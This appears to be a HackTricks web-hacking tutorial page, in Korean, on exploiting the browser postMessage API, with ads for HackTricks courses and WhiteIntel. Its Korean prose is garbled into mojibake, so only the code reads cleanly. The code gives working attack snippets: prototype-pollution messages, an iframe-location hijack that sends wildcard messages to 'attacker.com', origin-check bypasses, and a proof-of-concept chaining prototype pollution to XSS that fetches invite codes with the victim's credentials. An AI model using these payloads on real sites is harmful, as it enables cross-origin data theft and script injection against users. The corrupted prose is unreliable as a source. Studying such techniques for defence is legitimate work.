# PostMessage ì·¨ì•½ì 

## PostMessage ì·¨ì•½ì 

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)ì€ **ë‹¤í¬ ì›¹**ì„ í™œìš©í•œ ê²€ìƒ‰ ì—”ì§„ìœ¼ë¡œ, íšŒì‚¬ë‚˜ ê·¸ ê³ ê°ì´ **ìŠ¤í‹¸ëŸ¬ ì•…ì„± ì½”ë“œ**ì— ì˜í•´ **ì¹¨í•´**ë‹¹í–ˆëŠ”ì§€ ë¬´ë£Œë¡œ í™•ì¸í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.

WhiteIntelì˜ ì£¼ìš” ëª©í‘œëŠ” ì •ë³´ ë„ë‚œ ì•…ì„± ì½”ë“œë¡œ ì¸í•œ ê³„ì • íƒˆì·¨ ë° ëœì„¬ì›¨ì–´ ê³µê²©ì„ ë§‰ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê·¸ë“¤ì˜ ì›¹ì‚¬ì´íŠ¸ë¥¼ ë°©ë¬¸í•˜ì—¬ ì—”ì§„ì„ **ë¬´ë£Œë¡œ** ì‹œí—˜í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% embed url="https://whiteintel.io" %}

---

## **PostMessage** ë³´ë‚´ê¸°

**PostMessage**ëŠ” ë‹¤ìŒ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ë©”ì‹œì§€ë¥¼ ë³´ëƒ…ë‹ˆë‹¤:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
**targetOrigin**ì€ '\*' ë˜ëŠ” _https://company.com_ê³¼ ê°™ì€ URLì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
**ë‘ ë²ˆì§¸ ì‹œë‚˜ë¦¬ì˜¤**ì—ì„œëŠ” **ë©”ì‹œì§€ê°€ í•´ë‹¹ ë„ë©”ì¸ìœ¼ë¡œë§Œ ì „ì†¡**ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì°½ ê°ì²´ì˜ ì¶œì²˜ê°€ ë‹¤ë¥¸ ê²½ìš°ì—ë„ í•´ë‹¹).  
**ì™€ì¼ë“œì¹´ë“œ**ë¥¼ ì‚¬ìš©í•˜ë©´ **ë©”ì‹œì§€ê°€ ëª¨ë“  ë„ë©”ì¸ìœ¼ë¡œ ì „ì†¡**ë  ìˆ˜ ìˆìœ¼ë©° ì°½ ê°ì²´ì˜ ì¶œì²˜ë¡œ ì „ì†¡ë©ë‹ˆë‹¤.

### iframe ë° **targetOrigin**ì˜ ì™€ì¼ë“œì¹´ë“œ ê³µê²©

[**ì´ ë³´ê³ ì„œ**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)ì—ì„œ ì„¤ëª…í•œ ëŒ€ë¡œ, **X-Frame-Header** ë³´í˜¸ê°€ ì—†ëŠ” **iframed** í˜ì´ì§€ë¥¼ ì°¾ê³ , **ì™€ì¼ë“œì¹´ë“œ**(\*)ë¥¼ ì‚¬ìš©í•˜ì—¬ **postMessage**ë¥¼ í†µí•´ **ë¯¼ê°í•œ** ë©”ì‹œì§€ë¥¼ ë³´ë‚´ëŠ” í˜ì´ì§€ë¥¼ ì°¾ìœ¼ë©´ **iframe**ì˜ ì¶œì²˜ë¥¼ **ìˆ˜ì •**í•˜ì—¬ **ë¯¼ê°í•œ** ë©”ì‹œì§€ë¥¼ ì œì–´í•˜ëŠ” ë„ë©”ì¸ìœ¼ë¡œ **ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
í˜ì´ì§€ê°€ iframedë  ìˆ˜ ìˆì§€ë§Œ **targetOrigin**ì´ **URLë¡œ ì„¤ì •ë˜ì–´ ì™€ì¼ë“œì¹´ë“œê°€ ì•„ë‹Œ ê²½ìš°**, ì´ **íŠ¸ë¦­ì€ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`**ëŠ” JSì—ì„œ **`postMessages`ë¥¼ ê¸°ëŒ€í•˜ëŠ” í•¨ìˆ˜ë¥¼ ì„ ì–¸í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.**\
ë‹¤ìŒê³¼ ìœ ì‚¬í•œ ì½”ë“œê°€ ì‚¬ìš©ë©ë‹ˆë‹¤:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
### ì—´ê±°

í˜„ì¬ í˜ì´ì§€ì—ì„œ **ì´ë²¤íŠ¸ ë¦¬ìŠ¤ë„ˆë¥¼ ì°¾ìœ¼ë ¤ë©´** ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- JS ì½”ë“œì—ì„œ `window.addEventListener` ë° `$(window).on` (_JQuery ë²„ì „_)ì„ **ê²€ìƒ‰**í•©ë‹ˆë‹¤.
- ê°œë°œì ë„êµ¬ ì½˜ì†”ì—ì„œ ë‹¤ìŒì„ **ì‹¤í–‰**í•©ë‹ˆë‹¤: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

- ë¸Œë¼ìš°ì €ì˜ ê°œë°œì ë„êµ¬ì—ì„œ _Elements --> Event Listeners_ë¡œ ì´ë™í•©ë‹ˆë‹¤.

![](<../../.gitbook/assets/image (393).png>)

- [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ë˜ëŠ” [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker)ì™€ ê°™ì€ **ë¸Œë¼ìš°ì € í™•ì¥ í”„ë¡œê·¸ë¨**ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë¸Œë¼ìš°ì € í™•ì¥ í”„ë¡œê·¸ë¨ì€ **ëª¨ë“  ë©”ì‹œì§€ë¥¼ ê°€ë¡œì±„ì„œ í‘œì‹œ**í•©ë‹ˆë‹¤.

### Origin check bypasses

- **`event.isTrusted`** ì†ì„±ì€ ì§„ì •í•œ ì‚¬ìš©ì ì¡°ì‘ìœ¼ë¡œ ìƒì„±ëœ ì´ë²¤íŠ¸ì— ëŒ€í•´ì„œë§Œ `True`ë¥¼ ë°˜í™˜í•˜ë¯€ë¡œ ì•ˆì „í•˜ê²Œ ê°„ì£¼ë©ë‹ˆë‹¤. ì˜¬ë°”ë¥´ê²Œ êµ¬í˜„ëœ ê²½ìš° ìš°íšŒí•˜ê¸° ì–´ë µì§€ë§Œ, ë³´ì•ˆ ê²€ì‚¬ì—ì„œì˜ ì¤‘ìš”ì„±ì´ ë†’ìŠµë‹ˆë‹¤.
- PostMessage ì´ë²¤íŠ¸ì—ì„œ ì›ë³¸ ìœ íš¨ì„±ì„ ê²€ì‚¬í•˜ê¸° ìœ„í•´ **`indexOf()`** ì‚¬ìš©ì€ ìš°íšŒë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ ì„¤ëª…í•˜ëŠ” ì˜ˆì‹œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
- `String.prototype.search()`ì˜ **`search()`** ë©”ì„œë“œëŠ” ì •ê·œ í‘œí˜„ì‹ì„ ìœ„í•´ ì˜ë„ëœ ê²ƒì´ ì•„ë‹ˆë¼ ë¬¸ìì—´ì— ëŒ€í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. ì •ê·œ í‘œí˜„ì‹ ì´ì™¸ì˜ ê²ƒì„ ì „ë‹¬í•˜ë©´ ì•”ì‹œì ìœ¼ë¡œ ì •ê·œì‹ìœ¼ë¡œ ë³€í™˜ë˜ì–´ ë©”ì„œë“œê°€ ì ì¬ì ìœ¼ë¡œ ì•ˆì „í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¹íˆ ì •ê·œ í‘œí˜„ì‹ì—ì„œ ë§ˆì¹¨í‘œ(.)ëŠ” ì™€ì¼ë“œì¹´ë“œë¡œ ì‘ë™í•˜ì—¬ íŠ¹ìˆ˜í•˜ê²Œ ì‘ì„±ëœ ë„ë©”ì¸ìœ¼ë¡œ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
- `search()`ì™€ ìœ ì‚¬í•œ **`match()`** í•¨ìˆ˜ëŠ” ì •ê·œì‹ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì •ê·œì‹ì´ ë¶€ì ì ˆí•˜ê²Œ êµ¬ì„±ëœ ê²½ìš° ìš°íšŒ ê°€ëŠ¥ì„±ì´ ìˆìŠµë‹ˆë‹¤.
- **`escapeHtml`** í•¨ìˆ˜ëŠ” ë¬¸ìë¥¼ ì´ìŠ¤ì¼€ì´í”„í•˜ì—¬ ì…ë ¥ì„ ì •ë¦¬í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ìƒˆë¡œìš´ ì´ìŠ¤ì¼€ì´í”„ëœ ê°ì²´ë¥¼ ìƒì„±í•˜ì§€ ì•Šê³  ê¸°ì¡´ ê°ì²´ì˜ ì†ì„±ì„ ë®ì–´ì”ë‹ˆë‹¤. ì´ ë™ì‘ì€ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¹íˆ ê°ì²´ê°€ ì¡°ì‘ë˜ì–´ ì œì–´ëœ ì†ì„±ì´ `hasOwnProperty`ë¥¼ ì¸ì‹í•˜ì§€ ì•ŠëŠ” ê²½ìš°, `escapeHtml`ì€ ì˜ˆìƒëŒ€ë¡œ ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ ì˜ˆì‹œì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

*   ì˜ˆìƒí•œ ì‹¤íŒ¨:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
*   ì´ìŠ¤ì¼€ì´í”„ ìš°íšŒ:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

ì´ ì·¨ì•½ì ì˜ ë§¥ë½ì—ì„œ `File` ê°ì²´ëŠ” ì½ê¸° ì „ìš© `name` ì†ì„±ìœ¼ë¡œ ì¸í•´ ì£¼ëª©í• ë§Œí•œ ì·¨ì•½ì ì´ ìˆìŠµë‹ˆë‹¤. ì´ ì†ì„±ì€ í…œí”Œë¦¿ì—ì„œ ì‚¬ìš©ë  ë•Œ `escapeHtml` í•¨ìˆ˜ì— ì˜í•´ ì •ë¦¬ë˜ì§€ ì•Šì•„ ì ì¬ì ì¸ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- JavaScriptì˜ `document.domain` ì†ì„±ì€ ë„ë©”ì¸ì„ ë‹¨ì¶•ì‹œí‚¤ê¸° ìœ„í•´ ìŠ¤í¬ë¦½íŠ¸ì— ì˜í•´ ì„¤ì •ë  ìˆ˜ ìˆìœ¼ë©°, ë™ì¼í•œ ë¶€ëª¨ ë„ë©”ì¸ ë‚´ì—ì„œ ë³´ë‹¤ ìœ ì—°í•œ ë™ì¼ ì¶œì²˜ ì •ì±… ì ìš©ì„ í—ˆìš©í•©ë‹ˆë‹¤.

### e.origin == window.origin ìš°íšŒ

%%%%%%ë¥¼ ì‚¬ìš©í•˜ì—¬ **sandboxed iframe** ë‚´ì— ì›¹ í˜ì´ì§€ë¥¼ ì„ë² ë“œí•  ë•Œ, iframeì˜ ì›ë³¸ì´ nullë¡œ ì„¤ì •ë¨ì„ ì´í•´í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. ì´ëŠ” **sandbox ì†ì„±** ë° ë³´ì•ˆ ë° ê¸°ëŠ¥ì— ëŒ€í•œ ì˜í–¥ì„ ê³ ë ¤í•  ë•Œ íŠ¹íˆ ì¤‘ìš”í•©ë‹ˆë‹¤.

sandbox ì†ì„±ì— **`allow-popups`**ë¥¼ ì§€ì •í•˜ë©´ iframe ë‚´ì—ì„œ ì—´ë¦° íŒì—… ì°½ì€ ë¶€ëª¨ì˜ sandbox ì œí•œì„ ìƒì†í•©ë‹ˆë‹¤. ì´ëŠ” íŒì—… ì°½ì˜ ì›ë³¸ì´ `null`ë¡œ ì„¤ì •ë˜ë¯€ë¡œ, íŒì—… ì°½ì˜ ì›ë³¸ì´ iframeì˜ ì›ë³¸ê³¼ ì¼ì¹˜í•˜ë„ë¡ í•˜ëŠ” ê²½ìš° **`allow-popups-to-escape-sandbox`** ì†ì„±ì´ í¬í•¨ë˜ì§€ ì•ŠëŠ” í•œ, íŒì—… ì°½ì˜ ì›ë³¸ë„ `null`ë¡œ ì„¤ì •ë©ë‹ˆë‹¤.

ê²°ê³¼ì ìœ¼ë¡œ ì´ëŸ¬í•œ ì¡°ê±´ì—ì„œ íŒì—…ì´ ì—´ë¦¬ê³  iframeì—ì„œ íŒì—…ìœ¼ë¡œ **`postMessage`**ë¥¼ í†µí•´ ë©”ì‹œì§€ê°€ ì „ì†¡ë˜ë©´, ë³´ë‚´ëŠ” ìª½ê³¼ ë°›ëŠ” ìª½ì˜ ì›ë³¸ì´ ëª¨ë‘ `null`ë¡œ ì„¤ì •ë©ë‹ˆë‹¤. ì´ ìƒí™©ì€ iframeê³¼ íŒì—…ì´ ëª¨ë‘ `null`ì˜ ë™ì¼í•œ ì›ë³¸ ê°’ì„ ê°€ì§€ë¯€ë¡œ **`e.origin == window.origin`**ì´ trueë¡œ í‰ê°€ë©ë‹ˆë‹¤ (`null == null`).

ë” ë§ì€ ì •ë³´ë¥¼ ì›í•˜ì‹œë©´ **ë‹¤ìŒì„ ì½ìœ¼ì‹­ì‹œì˜¤**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.source ìš°íšŒ

ë©”ì‹œì§€ê°€ ìŠ¤í¬ë¦½íŠ¸ê°€ ìˆ˜ì‹  ëŒ€ê¸° ì¤‘ì¸ ë™ì¼í•œ ì°½ì—ì„œ ì™”ëŠ”ì§€ í™•ì¸í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤ (íŠ¹íˆ **ë¸Œë¼ìš°ì € í™•ì¥ í”„ë¡œê·¸ë¨ì˜ ì½˜í…ì¸  ìŠ¤í¬ë¦½íŠ¸**ì˜ ê²½ìš° í˜ì´ì§€ì—ì„œ ë©”ì‹œì§€ê°€ ë³´ë‚´ì¡ŒëŠ”ì§€ í™•ì¸í•˜ëŠ” ë° íŠ¹íˆ í¥ë¯¸ë¡œìš¸ ìˆ˜ ìˆìŒ):
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
ë©”ì‹œì§€ì˜ **`e.source`**ë¥¼ nullë¡œ ê°•ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ **`postMessage`ë¥¼ ë³´ë‚´ê³  ì¦‰ì‹œ ì‚­ì œë˜ëŠ”** **iframe**ì„ ìƒì„±í•©ë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” **ë‹¤ìŒì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header ìš°íšŒ

ì´ëŸ¬í•œ ê³µê²©ì„ ìˆ˜í–‰í•˜ë ¤ë©´ ì´ìƒì ìœ¼ë¡œ **í”¼í•´ì ì›¹ í˜ì´ì§€**ë¥¼ `iframe` ì•ˆì— ë„£ì„ ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ `X-Frame-Header`ì™€ ê°™ì€ ì¼ë¶€ í—¤ë”ëŠ” ê·¸ **ë™ì‘ì„ ë°©ì§€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ëŸ¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ì—¬ì „íˆ ëœ ì€ë°€í•œ ê³µê²©ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ ì›¹ ì‘ìš© í”„ë¡œê·¸ë¨ìœ¼ë¡œ ìƒˆ íƒ­ì„ ì—´ê³  í†µì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### ë©”ì¸ í˜ì´ì§€ ì°¨ë‹¨ì„ í†µí•œ ìì‹ì—ê²Œ ë³´ë‚¸ ë©”ì‹œì§€ ë„ìš©

ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” **ì£¼ìš” í˜ì´ì§€ë¥¼ ì°¨ë‹¨**í•˜ì—¬ ë°ì´í„°ë¥¼ ë³´ë‚´ê¸° ì „ì— **ì£¼ìš” í˜ì´ì§€ë¥¼ ì°¨ë‹¨**í•˜ê³  **ìì‹ iframe**ë¡œ ì „ì†¡ëœ **ë¯¼ê°í•œ postmessage ë°ì´í„°**ë¥¼ ë„ìš©í•˜ê³  **ìì‹ì˜ XSSë¥¼ ì•…ìš©**í•˜ì—¬ ë°ì´í„°ê°€ ìˆ˜ì‹ ë˜ê¸° ì „ì— **ë°ì´í„°ë¥¼ ë…¸ì¶œ**í•˜ëŠ” ë°©ë²•ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframe ìœ„ì¹˜ ìˆ˜ì •ì„ í†µí•œ ë©”ì‹œì§€ ë„ìš©

ë‹¤ë¥¸ iframeì„ í¬í•¨í•˜ëŠ” X-Frame-Headerê°€ ì—†ëŠ” ì›¹í˜ì´ì§€ë¥¼ iframeìœ¼ë¡œ í¬í•¨í•  ìˆ˜ ìˆë‹¤ë©´, **í•´ë‹¹ ìì‹ iframeì˜ ìœ„ì¹˜ë¥¼ ë³€ê²½**í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ, **ì™€ì¼ë“œì¹´ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì „ì†¡ëœ postmessage**ë¥¼ ìˆ˜ì‹  ì¤‘ì¸ ê²½ìš°, ê³µê²©ìëŠ” í•´ë‹¹ iframe **ì›ë³¸**ì„ ìì‹ ì´ **ì œì–´í•˜ëŠ” í˜ì´ì§€ë¡œ ë³€ê²½**í•˜ì—¬ ë©”ì‹œì§€ë¥¼ **ë„ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessageë¥¼ í†µí•œ Prototype Pollution ë°/ë˜ëŠ” XSS

`postMessage`ë¥¼ í†µí•´ ì „ì†¡ëœ ë°ì´í„°ê°€ JSì— ì˜í•´ ì‹¤í–‰ë˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” **í˜ì´ì§€ë¥¼ iframeìœ¼ë¡œ í¬í•¨**í•˜ê³  **prototype pollution/XSSë¥¼ ì•…ìš©**í•˜ì—¬ exploitì„ `postMessage`ë¥¼ í†µí•´ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`postMessage`ë¥¼ í†µí•´ **ë§¤ìš° ì˜ ì„¤ëª…ëœ XSS**ì˜ ì˜ˆëŠ” ë‹¤ìŒì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

`iframe`ë¡œ `postMessage`ë¥¼ í†µí•´ **Prototype Pollutionì„ ì•…ìš©í•œ í›„ XSS**ë¥¼ ì•…ìš©í•˜ëŠ” exploit ì˜ˆì‹œ:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**ë” ë§ì€ ì •ë³´**ë¥¼ ì›í•˜ì‹œë©´:

* [**í”„ë¡œí† íƒ€ì… ì˜¤ì—¼**](../deserialization/nodejs-proto-prototype-pollution/) í˜ì´ì§€ë¡œ ì´ë™
* [**XSS**](../xss-cross-site-scripting/) í˜ì´ì§€ë¡œ ì´ë™
* [**í´ë¼ì´ì–¸íŠ¸ ì¸¡ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ìœ¼ë¡œ XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss) í˜ì´ì§€ë¡œ ì´ë™

## ì°¸ê³  ìë£Œ

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* ì—°ìŠµí•˜ê¸°: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)ì€ **ë‹¤í¬ ì›¹**ì„ ê¸°ë°˜ìœ¼ë¡œ í•œ ê²€ìƒ‰ ì—”ì§„ìœ¼ë¡œ, íšŒì‚¬ë‚˜ ê·¸ ê³ ê°ì´ **ìŠ¤í‹¸ëŸ¬ ì•…ì„± ì†Œí”„íŠ¸ì›¨ì–´**ì— ì˜í•´ **ì¹¨í•´**ë‹¹í–ˆëŠ”ì§€ í™•ì¸í•˜ëŠ” **ë¬´ë£Œ** ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.

WhiteIntelì˜ ì£¼ìš” ëª©í‘œëŠ” ì •ë³´ë¥¼ ë„ë‚œí•˜ëŠ” ì•…ì„± ì†Œí”„íŠ¸ì›¨ì–´ë¡œ ì¸í•œ ê³„ì • íƒˆì·¨ì™€ ëœì„¬ì›¨ì–´ ê³µê²©ì„ ë§‰ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê·¸ë“¤ì˜ ì›¹ì‚¬ì´íŠ¸ë¥¼ ë°©ë¬¸í•˜ì—¬ ì—”ì§„ì„ **ë¬´ë£Œ**ë¡œ ì‚¬ìš©í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì— ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
